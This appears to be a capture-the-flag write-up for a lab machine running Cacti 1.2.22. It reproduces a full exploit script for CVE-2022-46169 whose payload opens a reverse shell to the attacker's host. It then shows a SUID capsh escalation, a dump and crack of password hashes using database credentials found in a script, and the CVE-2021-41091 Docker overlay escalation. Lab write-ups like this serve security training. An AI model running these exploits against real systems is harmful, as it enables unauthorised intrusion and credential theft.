```
Nmap scan report for 10.10.11.211
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# WebApp

In home page there's a login ..

reveals this
Version 1.2.22 | (c) 2004-2023 - The Cacti Group

which is affected to CVE-2022-46169

on Google found a promising [exploit](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)


```py
import requests, optparse, sys
import urllib

def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_target', help='The url target')
    parser.add_option('', '--LHOST', dest='lhost', help='Your ip')
    parser.add_option('', '--LPORT', dest='lport', help='The listening port')
    (options, arguments) = parser.parse_args()
    if not options.url_target:
        parser.error('[*] Pls indicate the target URL, example: -u http://10.10.10.10')
    if not options.lhost:
        parser.error('[*] Pls indicate your ip, example: --LHOST=10.10.10.10')
    if not options.lport:
        parser.error('[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443')
    return options

def checkVuln():
    r = requests.get(Vuln_url, headers=headers)
    return (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403)

def bruteForcing():
    for n in range(1,5):
        for n2 in range(1,10):
            id_vulnUrl = f"{Vuln_url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
            r = requests.get(id_vulnUrl, headers=headers)
            if r.text != "[]":
                RDname = r.json()[0]["rrd_name"]
                if RDname == "polling_time" or RDname == "uptime":
                    print("Bruteforce Success!!")
                    return True, n, n2
    return False, 1, 1

def Reverse_shell(payload, host_id, data_ids):
    PayloadEncoded = urllib.parse.quote(payload)
    InjectRequest = f"{Vuln_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
    r = requests.get(InjectRequest, headers=headers)


if __name__ == '__main__':
    options = get_arguments()
    Vuln_url = options.url_target + '/remote_agent.php'
    headers = {"X-Forwarded-For": "127.0.0.1"}
    print('Checking...')
    if checkVuln():
        print("The target is vulnerable. Exploiting...")
        print("Bruteforcing the host_id and local_data_ids")
        is_vuln, host_id, data_ids = bruteForcing()
        myip = options.lhost
        myport = options.lport
        payload = f"bash -c 'bash -i >& /dev/tcp/{myip}/{myport} 0>&1'"
        if is_vuln:
            Reverse_shell(payload, host_id, data_ids)
        else:
            print("The Bruteforce Failled...")

    else:
        print("The target is not vulnerable")
        sys.exit(1)


```



```bash
python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=IP --LPORT=443
```


## Spawn as www-data


```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.216.153] 36828
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

## Container root

```bash
find / -perm -4000 2>/dev/null

```

finds an interesting suid 


so if `/sbin//capsh --gid=0 --uid=0 --` we are root



also found a /entrypoint.sh which is a SUID



```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"

```


so if we connect in msyql with this command we can exfiltrate username and passwords 




```
mysql --host=db --user=root --password=root cacti -e "select * from user_auth;"

```


found 2 hashes;


and 2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C is cracked 


## SSH 


`ssh marcus@10.10.11.211` 

we are marcus now and i find with linpeas a cool command which is findmnt ! it reveals all path of the container and i see this

```
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NO
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYH
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k

```


in overlay2 i found this article https://github.com/UncleJ4ck/CVE-2021-41091

This exploit offers an in-depth look at the CVE-2021-41091 security vulnerability and provides a step-by-step guide on how to utilize the exploit script to achieve privilege escalation on a host.

#### Vuln 

CVE-2021-41091 is a flaw in Moby (Docker Engine) that allows unprivileged Linux users to traverse and execute programs within the data directory (usually located at /var/lib/docker) due to improperly restricted permissions. This vulnerability is present when containers contain executable programs with extended permissions, such as setuid. Unprivileged Linux users can then discover and execute those programs, as well as modify files if the UID of the user on the host matches the file owner or group inside the container.




#### Overlay


The overlay filesystem is a critical component in exploiting this vulnerability. Docker's overlay filesystem enables the container's file system to be layered on top of the host's file system, thus allowing the host system to access and manipulate the files within the container. In the case of CVE-2021-41091, the overly permissive directory permissions in /var/lib/docker/overlay2 enable unprivileged users to access and execute programs within the containers, leading to a potential privilege escalation attack. Exploitation Steps

- Connect to the Docker container hosted on your machine and obtain root access.

- Inside the container, set the setuid bit on /bin/bash with the following command: chmod u+s /bin/bash

- On the host system, run the provided exploit script (poc.sh) by cloning the repository and executing the script as follows:

```bash
git clone https://github.com/UncleJ4ck/CVE-2021-41091
cd CVE-2021-41091
chmod +x ./poc.sh
./poc.sh
```

The script will prompt you to confirm if you correctly set the setuid bit on /bin/bash in the Docker container. If the answer is "yes," the script will check if the host is vulnerable and iterate over the available overlay2 filesystems. If the system is indeed vulnerable, the script will attempt to gain root access by spawning a shell in the vulnerable path (the filesystem of the Docker container where you executed the setuid command on /bin/bash).



so connect once again in the container trough the CVE-2022-46169 then root the container and modify /bin/bash in a suid

then 

go on `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`

and then `cd bash`

`./bash -p`


and we are ROOT